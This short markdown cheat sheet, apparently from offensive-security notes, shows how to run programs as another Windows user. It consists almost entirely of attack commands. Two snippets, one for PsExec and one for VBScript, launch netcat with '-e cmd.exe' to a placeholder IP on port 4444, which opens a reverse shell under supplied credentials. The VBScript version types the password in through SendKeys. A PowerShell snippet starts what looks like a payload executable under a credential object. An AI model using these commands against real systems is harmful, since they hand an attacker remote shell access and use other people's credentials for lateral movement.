# Run as different user on windows

## PsExec

```sh
psexec.exe -u username -p password "C:\tmp\nc.exe" XX.XX.XX.XX 4444 -e cmd.exe
```

## Vbscript

```sh
Option explicit
dim oShell
set oShell= Wscript.CreateObject("WScript.Shell")
oShell.Run "runas /env /noprofile /user:username ""c:\\tmp\\nc.exe XX.XX.XX:XX 4444 -e cmd.exe"""
WScript.Sleep 100
oShell.Sendkeys "letmein"
Wscript.Quit%                                                   
```

## Powershell

```sh
$username = 'username'
$password = 'password'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process C:\temp\win32_443.exe -Credential $credential
```